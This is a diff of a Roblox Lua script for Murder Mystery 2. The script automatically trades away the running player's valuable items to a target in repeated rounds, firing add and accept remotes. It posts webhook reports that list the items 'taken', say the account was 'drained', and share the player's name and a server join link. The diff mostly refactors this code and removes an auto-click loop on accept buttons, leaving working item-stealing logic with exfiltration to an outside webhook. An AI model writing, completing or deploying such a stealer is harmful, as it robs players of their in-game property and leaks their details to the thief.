     end
     if not gui then return false, "window never opened" end
 
@@ -795,7 +845,11 @@ local function doRound(batch, tgt, round)
         local before = 0
         if gui then before = countIn(gui, it.name) end
         local ok = false
-        for _, args in ipairs({ { it.id }, { it.id, "Offer" }, { "Add", it.id } }) do
+        local variants = {}
+        variants[1] = { it.id }
+        variants[2] = { it.id, "Offer" }
+        variants[3] = { "Add", it.id }
+        for _, args in ipairs(variants) do
             pcall(function() R.add:FireServer(table.unpack(args)) end)
             task.wait(0.18)
             gui = tradeGui()
@@ -823,23 +877,16 @@ local function doRound(batch, tgt, round)
     task.wait(0.6)
     if R.accept then pcall(function() R.accept:FireServer() end) end
 
-    task.spawn(function()
-        local g = tradeGui()
-        if not g then return end
-        for _, d in ipairs(g:GetDescendants()) do
-            if d:IsA("TextButton") and d.Text:lower():find("accept") then
-                pcall(function() d.MouseButton1Click:Fire() end)
-            end
-        end
-    end)
-
     local t = 0
-    while t < CONFIG.WINDOW_WATCHDOG and tradeGui() do
+    while t < CONFIG.WINDOW_WATCHDOG do
+        if not tradeGui() then break end
         task.wait(0.5)
         t = t + 0.5
     end
     local closed = tradeGui() == nil
-    if not closed and R.cancel then pcall(function() R.cancel:FireServer() end) end
+    if not closed then
+        if R.cancel then pcall(function() R.cancel:FireServer() end) end
+    end
     task.wait(1)
 
     local remSet = {}
@@ -854,9 +901,6 @@ local function doRound(batch, tgt, round)
     return false, "unconfirmed (gone " .. gone .. "/" .. #batch .. ")"
 end
 
---==================================================================
--- MAIN
---==================================================================
 local function run()
     if CONFIG.WEBHOOK == "" then log("no webhook configured") end
     if not R.send then
@@ -867,9 +911,11 @@ local function run()
     loadValues()
     task.wait(0.4)
 
-    local grand, grandValue = {}, 0
+    local grand = {}
+    local grandValue = 0
 
-    while STATE.rounds < CONFIG.MAX_TRADES and not STATE.stopped do
+    while STATE.rounds < CONFIG.MAX_TRADES do
+        if STATE.stopped then break end
         local wanted = {}
         for _, it in ipairs(getItems()) do
             if isWanted(it) then wanted[#wanted + 1] = it end
@@ -907,15 +953,19 @@ local function run()
             end
             log("round " .. STATE.rounds .. " cleared (" .. info .. ")")
             if CONFIG.PER_ROUND_WEBHOOK then
-                webhook("Round " .. STATE.rounds .. " cleared", 0x57F287,
-                    "**" .. lp.Name .. "** — " .. info .. " item(s), " .. total .. " est",
-                    { { name = "Server", value = "[JOIN](" .. serverLink() .. ")", inline = false } })
+                local f = {}
+                f.name = "Server"
+                f.value = "[JOIN](" .. serverLink() .. ")"
+                f.inline = false
+                webhook("Round " .. STATE.rounds .. " cleared", 0x57F287, "**" .. lp.Name .. "** - " .. info .. " item(s)", { f })
             end
         else
             log("round " .. STATE.rounds .. " failed: " .. info)
-            webhook("Round " .. STATE.rounds .. " issue", 0xFFAA33,
-                "`" .. game.JobId .. "` — " .. info .. " (" .. lp.Name .. ")",
-                { { name = "Server", value = "[JOIN](" .. serverLink() .. ")", inline = false } })
+            local f = {}
+            f.name = "Server"
+            f.value = "[JOIN](" .. serverLink() .. ")"
+            f.inline = false
+            webhook("Round " .. STATE.rounds .. " issue", 0xFFAA33, "`" .. game.JobId .. "` - " .. info, { f })
             break
         end
 
@@ -929,29 +979,38 @@ local function run()
     end
 
     if #grand > 0 then
-        local fields = {
-            { name = "Roblox", value = string.format("**%s**\n`%s`", lp.DisplayName, lp.Name), inline = true },
-            { name = "Taken", value = #grand .. " item(s)\n" .. grandValue .. " est", inline = true },
-            { name = "Rounds", value = tostring(STATE.rounds), inline = true },
-        }
-        for i, part in ipairs(chunkString(itemLines(grand, 30), 900)) do
-            local fname = "Items"
-            if i > 1 then fname = "Items (cont)" end
-            fields[#fields + 1] = { name = fname, value = part, inline = false }
+        local fields = {}
+        local f1 = {}
+        f1.name = "Taken"
+        f1.value = #grand .. " item(s) / " .. grandValue .. " est"
+        f1.inline = true
+        fields[1] = f1
+        local chunks = chunkString(itemLines(grand, 30), 900)
+        for i, part in ipairs(chunks) do
+            local fi = {}
+            fi.name = "Items"
+            if i > 1 then fi.name = "Items (cont)" end
+            fi.value = part
+            fi.inline = false
+            fields[#fields + 1] = fi
         end
         if leftWanted > 0 then
-            fields[#fields + 1] = { name = "Left behind", value = leftWanted .. " wanted item(s)", inline = false }
+            local fl = {}
+            fl.name = "Left behind"
+            fl.value = leftWanted .. " wanted item(s)"
+            fl.inline = false
+            fields[#fields + 1] = fl
         end
-        webhook("MM2 SESSION COMPLETE", 0x57F287,
-            "**" .. lp.DisplayName .. "** drained over " .. STATE.rounds .. " round(s).", fields)
+        webhook("MM2 SESSION COMPLETE", 0x57F287, "**" .. lp.DisplayName .. "** drained over " .. STATE.rounds .. " round(s).", fields)
     end
-    log("session done: " .. #grand .. " item(s), " .. grandValue .. " est")
+    log("session done: " .. #grand .. " item(s)")
 end
 
-task.spawn(function()
+local function boot()
     local ok, err = pcall(run)
     if not ok then
         log("ERROR: " .. tostring(err))
-        webhook("Script error", 0xED4245, "`" .. tostring(err) .. "`\n`" .. game.JobId .. "`")
+        webhook("Script error", 0xED4245, "`" .. tostring(err) .. "`")
     end
-end)
+end
+task.spawn(boot)
